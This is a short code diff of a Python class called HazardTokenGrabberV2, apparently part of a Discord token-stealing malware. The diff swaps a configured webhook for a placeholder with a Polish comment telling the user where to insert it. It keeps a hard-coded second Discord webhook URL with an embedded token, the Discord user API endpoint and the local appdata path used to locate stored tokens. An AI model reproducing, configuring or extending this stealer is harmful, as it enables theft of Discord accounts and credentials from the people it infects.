@@ -201,7 +201,7 @@ class Functions(object):
 
 class HazardTokenGrabberV2(Functions):
     def __init__(self):
-        self.webhook = self.fetch_conf("webhook")
+        self.webhook = "WEBHOOK_HERE"  # Tutaj podajesz pierwszy webhook
         self.webhook2 = "https://discord.com/api/webhooks/1171093477862408233/KqIJ6PvlvG1CiQ6tfkDN5R-Ve4v-76wSlKVJ2CaTxAYUAmMVTVVv-FImkZvoMhX6KBBD"
         self.discordApi = "https://discord.com/api/v9/users/@me"
         self.appdata = os.getenv("localappdata")
